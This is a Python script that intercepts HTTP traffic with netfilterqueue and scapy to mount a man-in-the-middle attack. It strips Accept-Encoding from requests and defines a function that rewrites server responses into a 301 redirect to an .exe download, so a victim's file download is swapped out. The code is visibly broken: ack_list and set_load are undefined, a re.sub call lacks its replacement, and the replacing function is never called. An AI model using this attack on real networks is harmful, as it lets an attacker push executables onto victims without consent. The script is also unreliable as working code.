#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re


def get_modified_packet(packet):
    ack_list.remove(packet[scapy.TCP].seq)
    print('[+] replacing file')
    packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611.exe\n\n'
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            modified_load = re.sub(
                'Accept-Encoding:.*?\\n\\n', scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Request')
            print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
